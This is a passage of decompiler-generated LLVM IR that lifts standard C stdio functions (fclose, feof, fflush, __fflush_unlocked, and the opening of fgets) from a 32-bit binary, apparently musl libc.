  %v2_804d572 = add i32 %v1_804d572, 4
  %v3_804d572 = inttoptr i32 %v2_804d572 to i32*
  store i32 %v1_804d56f, i32* %v3_804d572, align 4
  br label %dec_label_pc_804d575

dec_label_pc_804d575:                             ; preds = %dec_label_pc_804d556, %dec_label_pc_804d552, %dec_label_pc_804d569
  %v0_804d578 = load i32, i32* %esi.global-to-local, align 4
  ret i32 %v0_804d578

; uselistorder directives
  uselistorder i32 %v3_804d556, { 1, 0, 2 }
  uselistorder i32 %v1_804d532, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32 %tmp7, { 0, 2, 1 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804d575, { 2, 0, 1 }
}

define i32 @__stdio_seek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_804d599 = add i32 %arg1, 60
  %v2_804d599 = inttoptr i32 %v1_804d599 to i32*
  %v3_804d599 = load i32, i32* %v2_804d599, align 4
  store i32 140, i32* @eax, align 4
  store i32 %v3_804d599, i32* @edx, align 4
  %v1_804d5c4 = call i32 @__vsyscall(i32 %arg4)
  %v1_804d5d0 = call i32 @__syscall_ret(i32 %v1_804d5c4)
  %v2_804d5d8 = icmp slt i32 %v1_804d5d0, 0
  %v1_804d5da = icmp eq i1 %v2_804d5d8, false
  br i1 %v1_804d5da, label %entry.dec_label_pc_804d5ec_crit_edge, label %dec_label_pc_804d5dc

entry.dec_label_pc_804d5ec_crit_edge:             ; preds = %entry
  %v3_804d5ec.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804d5ec

dec_label_pc_804d5dc:                             ; preds = %entry
  store i32 -1, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804d5ec

dec_label_pc_804d5ec:                             ; preds = %entry.dec_label_pc_804d5ec_crit_edge, %dec_label_pc_804d5dc
  %v3_804d5ec = phi i32 [ %v3_804d5ec.pre, %entry.dec_label_pc_804d5ec_crit_edge ], [ -1, %dec_label_pc_804d5dc ]
  ret i32 %v3_804d5ec

; uselistorder directives
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder label %dec_label_pc_804d5ec, { 1, 0 }
}

define i32 @dummy.6(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804d5fc = load i32, i32* @eax, align 4
  ret i32 %v0_804d5fc
}

define i32 @fclose(i32* %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp17 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %v0_804d5fe = load i32, i32* @edi, align 4
  %v0_804d5ff = load i32, i32* @esi, align 4
  %v0_804d600 = load i32, i32* @ebx, align 4
  store i32 %tmp17, i32* @ebx, align 4
  %v1_804d610 = add i32 %tmp17, 76
  %v2_804d610 = inttoptr i32 %v1_804d610 to i32*
  %v3_804d610 = load i32, i32* %v2_804d610, align 4
  store i32 %v3_804d610, i32* @eax, align 4
  %v2_804d613 = icmp slt i32 %v3_804d610, 0
  br i1 %v2_804d613, label %entry.dec_label_pc_804d627_crit_edge, label %dec_label_pc_804d617

entry.dec_label_pc_804d627_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804d627

dec_label_pc_804d617:                             ; preds = %entry
  store i32 %tmp17, i32* %stack_var_-44, align 4
  %v1_804d61b = call i32 @__lockfile(i32 %tmp17)
  store i32 %v1_804d61b, i32* @eax, align 4
  %v0_804d62a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d627

dec_label_pc_804d627:                             ; preds = %entry.dec_label_pc_804d627_crit_edge, %dec_label_pc_804d617
  %stack_var_-20.0 = phi i32 [ 0, %entry.dec_label_pc_804d627_crit_edge ], [ %v1_804d61b, %dec_label_pc_804d617 ]
  %v0_804d62a = phi i32 [ %tmp17, %entry.dec_label_pc_804d627_crit_edge ], [ %v0_804d62a.pre, %dec_label_pc_804d617 ]
  store i32 %v0_804d62a, i32* %stack_var_-44, align 4
  %v1_804d62b = call i32 @dummy.6(i32 %v0_804d62a)
  %v0_804d630 = load i32, i32* @ebx, align 4
  %v1_804d630 = inttoptr i32 %v0_804d630 to i32*
  %v2_804d630 = load i32, i32* %v1_804d630, align 4
  %v1_804d635 = urem i32 %v2_804d630, 2
  %v2_804d635 = icmp eq i32 %v1_804d635, 0
  store i32 %v1_804d635, i32* @ebp, align 4
  %v1_804d638 = icmp eq i1 %v2_804d635, false
  br i1 %v1_804d638, label %dec_label_pc_804d669, label %dec_label_pc_804d63a

dec_label_pc_804d63a:                             ; preds = %dec_label_pc_804d627
  %v0_804d63a = load i32, i32* %stack_var_-44, align 4
  %v1_804d63a = call i32 @__ofl_lock(i32 %v0_804d63a)
  %v0_804d63f = load i32, i32* @ebx, align 4
  %v1_804d63f = add i32 %v0_804d63f, 52
  %v2_804d63f = inttoptr i32 %v1_804d63f to i32*
  %v3_804d63f = load i32, i32* %v2_804d63f, align 4
  %v1_804d642 = icmp eq i32 %v3_804d63f, 0
  store i32 %v1_804d63a, i32* %ecx.global-to-local, align 4
  br i1 %v1_804d642, label %dec_label_pc_804d64e, label %dec_label_pc_804d648

dec_label_pc_804d648:                             ; preds = %dec_label_pc_804d63a
  %v1_804d648 = add i32 %v0_804d63f, 56
  %v2_804d648 = inttoptr i32 %v1_804d648 to i32*
  %v3_804d648 = load i32, i32* %v2_804d648, align 4
  %v2_804d64b = add i32 %v3_804d63f, 56
  %v3_804d64b = inttoptr i32 %v2_804d64b to i32*
  store i32 %v3_804d648, i32* %v3_804d64b, align 4
  %v0_804d64e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d64e

dec_label_pc_804d64e:                             ; preds = %dec_label_pc_804d63a, %dec_label_pc_804d648
  %v0_804d655 = phi i32 [ %v0_804d63f, %dec_label_pc_804d63a ], [ %v0_804d64e.pre, %dec_label_pc_804d648 ]
  %v1_804d64e = add i32 %v0_804d655, 56
  %v2_804d64e = inttoptr i32 %v1_804d64e to i32*
  %v3_804d64e = load i32, i32* %v2_804d64e, align 4
  %v1_804d651 = icmp eq i32 %v3_804d64e, 0
  br i1 %v1_804d651, label %dec_label_pc_804d65b, label %dec_label_pc_804d655

dec_label_pc_804d655:                             ; preds = %dec_label_pc_804d64e
  %v1_804d655 = add i32 %v0_804d655, 52
  %v2_804d655 = inttoptr i32 %v1_804d655 to i32*
  %v3_804d655 = load i32, i32* %v2_804d655, align 4
  %v2_804d658 = add i32 %v3_804d64e, 52
  %v3_804d658 = inttoptr i32 %v2_804d658 to i32*
  store i32 %v3_804d655, i32* %v3_804d658, align 4
  %v3_804d65b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d65b

dec_label_pc_804d65b:                             ; preds = %dec_label_pc_804d64e, %dec_label_pc_804d655
  %v0_804d65f = phi i32 [ %v0_804d655, %dec_label_pc_804d64e ], [ %v3_804d65b.pre, %dec_label_pc_804d655 ]
  %v0_804d65b = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d65b = inttoptr i32 %v0_804d65b to i32*
  %v2_804d65b = load i32, i32* %v1_804d65b, align 4
  %v14_804d65b = icmp eq i32 %v2_804d65b, %v0_804d65f
  %v1_804d65d = icmp eq i1 %v14_804d65b, false
  br i1 %v1_804d65d, label %dec_label_pc_804d664, label %dec_label_pc_804d65f

dec_label_pc_804d65f:                             ; preds = %dec_label_pc_804d65b
  %v1_804d65f = add i32 %v0_804d65f, 56
  %v2_804d65f = inttoptr i32 %v1_804d65f to i32*
  %v3_804d65f = load i32, i32* %v2_804d65f, align 4
  store i32 %v3_804d65f, i32* %v1_804d65b, align 4
  br label %dec_label_pc_804d664

dec_label_pc_804d664:                             ; preds = %dec_label_pc_804d65b, %dec_label_pc_804d65f
  %v0_804d664 = call i32 @__ofl_unlock()
  %v0_804d66c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d669

dec_label_pc_804d669:                             ; preds = %dec_label_pc_804d627, %dec_label_pc_804d664
  %v0_804d66c = phi i32 [ %v0_804d630, %dec_label_pc_804d627 ], [ %v0_804d66c.pre, %dec_label_pc_804d664 ]
  store i32 %v0_804d66c, i32* %stack_var_-44, align 4
  %v1_804d66d = call i32 @fflush(i32 %v0_804d66c)
  %v0_804d672 = load i32, i32* @ebx, align 4
  store i32 %v0_804d672, i32* %stack_var_-44, align 4
  store i32 %v1_804d66d, i32* @edi, align 4
  %v5_804d677 = add i32 %v0_804d672, 12
  %v6_804d677 = inttoptr i32 %v5_804d677 to i32*
  %v7_804d677 = load i32, i32* %v6_804d677, align 4
  call void @__pseudo_call(i32 %v7_804d677)
  store i32 %v1_804d66d, i32* @esi, align 4
  %v0_804d67f = load i32, i32* @ebx, align 4
  %v1_804d67f = add i32 %v0_804d67f, 96
  %v2_804d67f = inttoptr i32 %v1_804d67f to i32*
  %v3_804d67f = load i32, i32* %v2_804d67f, align 4
  store i32 %v3_804d67f, i32* @eax, align 4
  %v1_804d682 = icmp eq i32 %v3_804d67f, 0
  br i1 %v1_804d682, label %dec_label_pc_804d692, label %dec_label_pc_804d686

dec_label_pc_804d686:                             ; preds = %dec_label_pc_804d669
  %v1_804d68a = call i32 @free(i32 %v3_804d67f)
  store i32 %v1_804d68a, i32* @eax, align 4
  br label %dec_label_pc_804d692

dec_label_pc_804d692:                             ; preds = %dec_label_pc_804d669, %dec_label_pc_804d686
  br i1 %v1_804d638, label %dec_label_pc_804d6a1, label %dec_label_pc_804d696

dec_label_pc_804d696:                             ; preds = %dec_label_pc_804d692
  %v0_804d699 = load i32, i32* @ebx, align 4
  %v1_804d69a = call i32 @free(i32 %v0_804d699)
  br label %dec_label_pc_804d6b1

dec_label_pc_804d6a1:                             ; preds = %dec_label_pc_804d692
  %v4_804d6a1 = icmp eq i32 %tmp, 0
  br i1 %v4_804d6a1, label %dec_label_pc_804d6b4, label %dec_label_pc_804d6a8

dec_label_pc_804d6a8:                             ; preds = %dec_label_pc_804d6a1
  %v0_804d6ab = load i32, i32* @ebx, align 4
  %v1_804d6ac = call i32 @__unlockfile(i32 %v0_804d6ab)
  br label %dec_label_pc_804d6b1

dec_label_pc_804d6b1:                             ; preds = %dec_label_pc_804d696, %dec_label_pc_804d6a8
  br label %dec_label_pc_804d6b4

dec_label_pc_804d6b4:                             ; preds = %dec_label_pc_804d6a1, %dec_label_pc_804d6b1
  %v0_804d6b4 = load i32, i32* @esi, align 4
  %v1_804d6b4 = load i32, i32* @edi, align 4
  %v2_804d6b4 = or i32 %v1_804d6b4, %v0_804d6b4
  store i32 %stack_var_-20.0, i32* @ebx, align 4
  store i32 %v0_804d600, i32* @esi, align 4
  store i32 %v0_804d5ff, i32* @edi, align 4
  store i32 %v0_804d5fe, i32* @ebp, align 4
  ret i32 %v2_804d6b4

; uselistorder directives
  uselistorder i32 %v0_804d66c, { 1, 0 }
  uselistorder i32 %v0_804d65f, { 1, 0 }
  uselistorder i32 %v1_804d635, { 1, 0 }
  uselistorder i32 %v0_804d62a, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp17, { 0, 2, 1, 4, 3 }
  uselistorder i32 (i32)* @free, { 4, 3, 0, 10, 9, 8, 1, 7, 6, 5, 2 }
  uselistorder label %dec_label_pc_804d6b4, { 1, 0 }
  uselistorder label %dec_label_pc_804d6b1, { 1, 0 }
  uselistorder label %dec_label_pc_804d692, { 1, 0 }
  uselistorder label %dec_label_pc_804d669, { 1, 0 }
  uselistorder label %dec_label_pc_804d664, { 1, 0 }
  uselistorder label %dec_label_pc_804d65b, { 1, 0 }
  uselistorder label %dec_label_pc_804d64e, { 1, 0 }
  uselistorder label %dec_label_pc_804d627, { 1, 0 }
}

define i32 @feof(i32* %arg1) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v0_804d6c0 = load i32, i32* @esi, align 4
  %v0_804d6c3 = load i32, i32* @ebx, align 4
  %v1_804d6cb = add i32 %tmp6, 76
  %v2_804d6cb = inttoptr i32 %v1_804d6cb to i32*
  %v3_804d6cb = load i32, i32* %v2_804d6cb, align 4
  %v2_804d6ce = icmp slt i32 %v3_804d6cb, 0
  br i1 %v2_804d6ce, label %dec_label_pc_804d6e0, label %dec_label_pc_804d6d2

dec_label_pc_804d6d2:                             ; preds = %entry
  %v1_804d6d6 = call i32 @__lockfile(i32 %tmp6)
  %v0_804d6e2.pre = load i32, i32* @esi, align 4
  %phitmp = icmp eq i32 %v1_804d6d6, 0
  br label %dec_label_pc_804d6e0

dec_label_pc_804d6e0:                             ; preds = %entry, %dec_label_pc_804d6d2
  %v0_804d6e9 = phi i32 [ %tmp6, %entry ], [ %v0_804d6e2.pre, %dec_label_pc_804d6d2 ]
  %v0_804d6e0 = phi i1 [ true, %entry ], [ %phitmp, %dec_label_pc_804d6d2 ]
  %v1_804d6e2 = inttoptr i32 %v0_804d6e9 to i32*
  %v2_804d6e2 = load i32, i32* %v1_804d6e2, align 4
  store i32 %v2_804d6e2, i32* @ebx, align 4
  br i1 %v0_804d6e0, label %dec_label_pc_804d6f2, label %dec_label_pc_804d6e6

dec_label_pc_804d6e6:                             ; preds = %dec_label_pc_804d6e0
  %v1_804d6ea = call i32 @__unlockfile(i32 %v0_804d6e9)
  %v0_804d6f2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d6f2

dec_label_pc_804d6f2:                             ; preds = %dec_label_pc_804d6e0, %dec_label_pc_804d6e6
  %v0_804d6f2 = phi i32 [ %v2_804d6e2, %dec_label_pc_804d6e0 ], [ %v0_804d6f2.pre, %dec_label_pc_804d6e6 ]
  %v2_804d6f2 = udiv i32 %v0_804d6f2, 16
  %v1_804d6f5 = urem i32 %v2_804d6f2, 2
  %v2_804d6fa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d6fa, i32* @edx, align 4
  store i32 %v0_804d6c3, i32* @ebx, align 4
  store i32 %v0_804d6c0, i32* @esi, align 4
  ret i32 %v1_804d6f5

; uselistorder directives
  uselistorder label %dec_label_pc_804d6f2, { 1, 0 }
  uselistorder label %dec_label_pc_804d6e0, { 1, 0 }
}

define i32 @__fflush_unlocked(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804d708 = add i32 %arg1, 20
  %v2_804d708 = inttoptr i32 %v1_804d708 to i32*
  %v3_804d708 = load i32, i32* %v2_804d708, align 4
  store i32 %v3_804d708, i32* %eax.global-to-local, align 4
  %v2_804d70b = add i32 %arg1, 28
  %v3_804d70b = inttoptr i32 %v2_804d70b to i32*
  %v4_804d70b = load i32, i32* %v3_804d70b, align 4
  %tmp = icmp ugt i32 %v3_804d708, %v4_804d70b
  br i1 %tmp, label %dec_label_pc_804d710, label %dec_label_pc_804d725

dec_label_pc_804d710:                             ; preds = %entry
  %v5_804d716 = add i32 %arg1, 36
  %v6_804d716 = inttoptr i32 %v5_804d716 to i32*
  %v7_804d716 = load i32, i32* %v6_804d716, align 4
  call void @__pseudo_call(i32 %v7_804d716)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804d71f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d71f = add i32 %v0_804d71f, 20
  %v2_804d71f = inttoptr i32 %v1_804d71f to i32*
  %v3_804d71f = load i32, i32* %v2_804d71f, align 4
  %v4_804d71f = icmp eq i32 %v3_804d71f, 0
  br i1 %v4_804d71f, label %dec_label_pc_804d762, label %dec_label_pc_804d725

dec_label_pc_804d725:                             ; preds = %entry, %dec_label_pc_804d710
  %v4_804d737 = phi i32 [ %v0_804d71f, %dec_label_pc_804d710 ], [ %arg1, %entry ]
  %v1_804d725 = add i32 %v4_804d737, 4
  %v2_804d725 = inttoptr i32 %v1_804d725 to i32*
  %v3_804d725 = load i32, i32* %v2_804d725, align 4
  store i32 %v3_804d725, i32* %eax.global-to-local, align 4
  %v1_804d728 = add i32 %v4_804d737, 8
  %v2_804d728 = inttoptr i32 %v1_804d728 to i32*
  %v3_804d728 = load i32, i32* %v2_804d728, align 4
  %v7_804d72b = icmp ult i32 %v3_804d725, %v3_804d728
  %v1_804d72d = icmp eq i1 %v7_804d72b, false
  br i1 %v1_804d72d, label %dec_label_pc_804d73d, label %dec_label_pc_804d72f

dec_label_pc_804d72f:                             ; preds = %dec_label_pc_804d725
  %v2_804d72b = sub i32 %v3_804d725, %v3_804d728
  store i32 %v2_804d72b, i32* %eax.global-to-local, align 4
  %v5_804d737 = add i32 %v4_804d737, 40
  %v6_804d737 = inttoptr i32 %v5_804d737 to i32*
  %v7_804d737 = load i32, i32* %v6_804d737, align 4
  call void @__pseudo_call(i32 %v7_804d737)
  %v0_804d73d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d73d

dec_label_pc_804d73d:                             ; preds = %dec_label_pc_804d725, %dec_label_pc_804d72f
  %v0_804d73d = phi i32 [ %v4_804d737, %dec_label_pc_804d725 ], [ %v0_804d73d.pre, %dec_label_pc_804d72f ]
  %v1_804d73d = add i32 %v0_804d73d, 16
  %v2_804d73d = inttoptr i32 %v1_804d73d to i32*
  store i32 0, i32* %v2_804d73d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804d746 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d746 = add i32 %v0_804d746, 28
  %v2_804d746 = inttoptr i32 %v1_804d746 to i32*
  store i32 0, i32* %v2_804d746, align 4
  %v0_804d74d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d74d = add i32 %v0_804d74d, 20
  %v2_804d74d = inttoptr i32 %v1_804d74d to i32*
  store i32 0, i32* %v2_804d74d, align 4
  %v0_804d754 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d754 = add i32 %v0_804d754, 8
  %v2_804d754 = inttoptr i32 %v1_804d754 to i32*
  store i32 0, i32* %v2_804d754, align 4
  %v0_804d75b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d75b = add i32 %v0_804d75b, 4
  %v2_804d75b = inttoptr i32 %v1_804d75b to i32*
  store i32 0, i32* %v2_804d75b, align 4
  %v0_804d765.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d762

dec_label_pc_804d762:                             ; preds = %dec_label_pc_804d710, %dec_label_pc_804d73d
  %v0_804d765 = phi i32 [ -1, %dec_label_pc_804d710 ], [ %v0_804d765.pre, %dec_label_pc_804d73d ]
  ret i32 %v0_804d765

; uselistorder directives
  uselistorder i32 %v4_804d737, { 0, 1, 3, 2 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %arg1, { 0, 1, 4, 3, 2 }
  uselistorder label %dec_label_pc_804d762, { 1, 0 }
  uselistorder label %dec_label_pc_804d73d, { 1, 0 }
  uselistorder label %dec_label_pc_804d725, { 1, 0 }
}

define i32 @fflush(i32 %arg1) local_unnamed_addr {
entry:
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_804d766 = load i32, i32* @edi, align 4
  %v0_804d768 = load i32, i32* @ebx, align 4
  store i32 %v0_804d768, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804d76d = icmp eq i32 %arg1, 0
  br i1 %v1_804d76d, label %dec_label_pc_804d7a8, label %dec_label_pc_804d771

dec_label_pc_804d771:                             ; preds = %entry
  %v1_804d771 = add i32 %arg1, 76
  %v2_804d771 = inttoptr i32 %v1_804d771 to i32*
  %v3_804d771 = load i32, i32* %v2_804d771, align 4
  store i32 0, i32* @edi, align 4
  %v2_804d776 = icmp slt i32 %v3_804d771, 0
  br i1 %v2_804d776, label %dec_label_pc_804d771.dec_label_pc_804d788_crit_edge, label %dec_label_pc_804d77a

dec_label_pc_804d771.dec_label_pc_804d788_crit_edge: ; preds = %dec_label_pc_804d771
  br label %dec_label_pc_804d788

dec_label_pc_804d77a:                             ; preds = %dec_label_pc_804d771
  %v1_804d77e = call i32 @__lockfile(i32 %arg1)
  store i32 %v1_804d77e, i32* @edi, align 4
  br label %dec_label_pc_804d788

dec_label_pc_804d788:                             ; preds = %dec_label_pc_804d771.dec_label_pc_804d788_crit_edge, %dec_label_pc_804d77a
  %v1_804d78c = call i32 @__fflush_unlocked(i32 %arg1)
  %v0_804d794 = load i32, i32* @edi, align 4
  %v1_804d794 = icmp eq i32 %v0_804d794, 0
  store i32 %v1_804d78c, i32* @esi, align 4
  br i1 %v1_804d794, label %dec_label_pc_804d818, label %dec_label_pc_804d79a

dec_label_pc_804d79a:                             ; preds = %dec_label_pc_804d788
  %v1_804d79e = call i32 @__unlockfile(i32 %arg1)
  br label %dec_label_pc_804d818

dec_label_pc_804d7a8:                             ; preds = %entry
  %v0_804d7a8 = load i32, i32* @global_var_8056dec.368, align 4
  store i32 0, i32* @esi, align 4
  %v1_804d7af = icmp eq i32 %v0_804d7a8, 0
  br i1 %v1_804d7af, label %dec_label_pc_804d7c6, label %dec_label_pc_804d7b3

dec_label_pc_804d7b3:                             ; preds = %dec_label_pc_804d7a8
  %v1_804d7bc = call i32 @fflush(i32 %v0_804d7a8)
  store i32 %v1_804d7bc, i32* @esi, align 4
  br label %dec_label_pc_804d7c6

dec_label_pc_804d7c6:                             ; preds = %dec_label_pc_804d7a8, %dec_label_pc_804d7b3
  %v0_804d7c6 = phi i32 [ %tmp25, %dec_label_pc_804d7a8 ], [ %v0_804d7a8, %dec_label_pc_804d7b3 ]
  %v1_804d7c6 = call i32 @__ofl_lock(i32 %v0_804d7c6)
  %storemerge.in1 = inttoptr i32 %v1_804d7c6 to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* @ebx, align 4
  %v1_804d80f3 = icmp eq i32 %storemerge2, 0
  %v1_804d81110 = icmp eq i1 %v1_804d80f3, false
  br i1 %v1_804d81110, label %dec_label_pc_804d7cf.lr.ph, label %dec_label_pc_804d813

dec_label_pc_804d7cf.lr.ph:                       ; preds = %dec_label_pc_804d7c6
  br label %dec_label_pc_804d7cf

dec_label_pc_804d7cf:                             ; preds = %dec_label_pc_804d7cf.lr.ph, %dec_label_pc_804d80c
  %v0_804d7db = phi i32 [ %storemerge2, %dec_label_pc_804d7cf.lr.ph ], [ %storemerge, %dec_label_pc_804d80c ]
  %v1_804d7cf = add i32 %v0_804d7db, 76
  %v2_804d7cf = inttoptr i32 %v1_804d7cf to i32*
  %v3_804d7cf = load i32, i32* %v2_804d7cf, align 4
  store i32 0, i32* @edi, align 4
  %v2_804d7d4 = icmp slt i32 %v3_804d7cf, 0
  br i1 %v2_804d7d4, label %dec_label_pc_804d7e6, label %dec_label_pc_804d7d8

dec_label_pc_804d7d8:                             ; preds = %dec_label_pc_804d7cf
  %v1_804d7dc = call i32 @__lockfile(i32 %v0_804d7db)
  store i32 %v1_804d7dc, i32* @edi, align 4
  %v0_804d7e6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d7e6

dec_label_pc_804d7e6:                             ; preds = %dec_label_pc_804d7cf, %dec_label_pc_804d7d8
  %v0_804d7fc16 = phi i32 [ 0, %dec_label_pc_804d7cf ], [ %v1_804d7dc, %dec_label_pc_804d7d8 ]
  %v0_804d7f1 = phi i32 [ %v0_804d7db, %dec_label_pc_804d7cf ], [ %v0_804d7e6.pre, %dec_label_pc_804d7d8 ]
  %v1_804d7e6 = add i32 %v0_804d7f1, 20
  %v2_804d7e6 = inttoptr i32 %v1_804d7e6 to i32*
  %v3_804d7e6 = load i32, i32* %v2_804d7e6, align 4
  %v2_804d7e9 = add i32 %v0_804d7f1, 28
  %v3_804d7e9 = inttoptr i32 %v2_804d7e9 to i32*
  %v4_804d7e9 = load i32, i32* %v3_804d7e9, align 4
  %tmp = icmp ugt i32 %v3_804d7e6, %v4_804d7e9
  br i1 %tmp, label %dec_label_pc_804d7ee, label %dec_label_pc_804d7fc

dec_label_pc_804d7ee:                             ; preds = %dec_label_pc_804d7e6
  %v1_804d7f2 = call i32 @__fflush_unlocked(i32 %v0_804d7f1)
  %v0_804d7fa = load i32, i32* @esi, align 4
  %v2_804d7fa = or i32 %v0_804d7fa, %v1_804d7f2
  store i32 %v2_804d7fa, i32* @esi, align 4
  %v0_804d7fc.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d7fc

dec_label_pc_804d7fc:                             ; preds = %dec_label_pc_804d7e6, %dec_label_pc_804d7ee
  %v0_804d7fc = phi i32 [ %v0_804d7fc16, %dec_label_pc_804d7e6 ], [ %v0_804d7fc.pre, %dec_label_pc_804d7ee ]
  %v1_804d7fc = icmp eq i32 %v0_804d7fc, 0
  br i1 %v1_804d7fc, label %dec_label_pc_804d80c, label %dec_label_pc_804d800

dec_label_pc_804d800:                             ; preds = %dec_label_pc_804d7fc
  %v0_804d803 = load i32, i32* @ebx, align 4
  %v1_804d804 = call i32 @__unlockfile(i32 %v0_804d803)
  br label %dec_label_pc_804d80c

dec_label_pc_804d80c:                             ; preds = %dec_label_pc_804d7fc, %dec_label_pc_804d800
  %v0_804d80c = load i32, i32* @ebx, align 4
  %v1_804d80c = add i32 %v0_804d80c, 56
  %storemerge.in = inttoptr i32 %v1_804d80c to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @ebx, align 4
  %v1_804d80f = icmp eq i32 %storemerge, 0
  %v1_804d811 = icmp eq i1 %v1_804d80f, false
  br i1 %v1_804d811, label %dec_label_pc_804d7cf, label %dec_label_pc_804d813

dec_label_pc_804d813:                             ; preds = %dec_label_pc_804d80c, %dec_label_pc_804d7c6
  %v0_804d813 = call i32 @__ofl_unlock()
  br label %dec_label_pc_804d818

dec_label_pc_804d818:                             ; preds = %dec_label_pc_804d788, %dec_label_pc_804d79a, %dec_label_pc_804d813
  %v0_804d818 = load i32, i32* @esi, align 4
  %v2_804d81a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d81a, i32* @ebx, align 4
  store i32 %v0_804d766, i32* @edi, align 4
  ret i32 %v0_804d818

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_804d7f1, { 0, 2, 1 }
  uselistorder i32 (i32)* @fflush, { 1, 0 }
  uselistorder i32 (i32)* @__fflush_unlocked, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_804d818, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d80c, { 1, 0 }
  uselistorder label %dec_label_pc_804d7fc, { 1, 0 }
  uselistorder label %dec_label_pc_804d7e6, { 1, 0 }
  uselistorder label %dec_label_pc_804d7cf, { 1, 0 }
  uselistorder label %dec_label_pc_804d7c6, { 1, 0 }
  uselistorder label %dec_label_pc_804d788, { 1, 0 }
}

define i32 @fgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804d821 = load i32, i32* @edi, align 4
  %v0_804d822 = load i32, i32* @esi, align 4
  %v0_804d823 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v1_804d82f = add i32 %arg3, 76
  %v2_804d82f = inttoptr i32 %v1_804d82f to i32*
  %v3_804d82f = load i32, i32* %v2_804d82f, align 4
  %v2_804d83a = icmp slt i32 %v3_804d82f, 0
  br i1 %v2_804d83a, label %dec_label_pc_804d84e, label %dec_label_pc_804d83e

dec_label_pc_804d83e:                             ; preds = %entry
  %v2_804d842 = call i32 @__lockfile(i32 %arg3)
  %v0_804d84e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d84e

dec_label_pc_804d84e:                             ; preds = %entry, %dec_label_pc_804d83e
  %v0_804d84e = phi i32 [ %arg2, %entry ], [ %v0_804d84e.pre, %dec_label_pc_804d83e ]
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v2_804d842, %dec_label_pc_804d83e ]
  %v1_804d84e = add i32 %v0_804d84e, -1
  %v5_804d851 = sub i32 0, %v0_804d84e
  %v6_804d851 = and i32 %v0_804d84e, %v5_804d851
  %v7_804d851 = icmp slt i32 %v6_804d851, 0
  %v8_804d851 = icmp eq i32 %v1_804d84e, 0
  %v9_804d851 = icmp slt i32 %v1_804d84e, 0
  store i32 %v1_804d84e, i32* @ebx, align 4
  %v4_804d852 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d852, i32* @edi, align 4
  %v3_804d85a = icmp eq i1 %v9_804d851, %v7_804d851
  %v4_804d85a = icmp eq i1 %v8_804d851, false
  %v5_804d85a = and i1 %v4_804d85a, %v3_804d85a
  br i1 %v5_804d85a, label %dec_label_pc_804d89e.lr.ph, label %dec_label_pc_804d860

dec_label_pc_804d89e.lr.ph:                       ; preds = %dec_label_pc_804d84e
  br label %dec_label_pc_804d89e

dec_label_pc_804d860:                             ; preds = %dec_label_pc_804d84e
  %v0_804d860 = load i32, i32* @esi, align 4
  %v1_804d860 = add i32 %v0_804d860, 74
  %v2_804d860 = inttoptr i32 %v1_804d860 to i8*
  %v3_804d860 = load i8, i8* %v2_804d860, align 1
  %v4_804d860 = zext i8 %v3_804d860 to i32
  %v5_804d860 = load i32, i32* @edx, align 4
  %v6_804d860 = and i32 %v5_804d860, -256
  %v7_804d860 = or i32 %v6_804d860, %v4_804d860
  store i32 %v7_804d860, i32* @edx, align 4
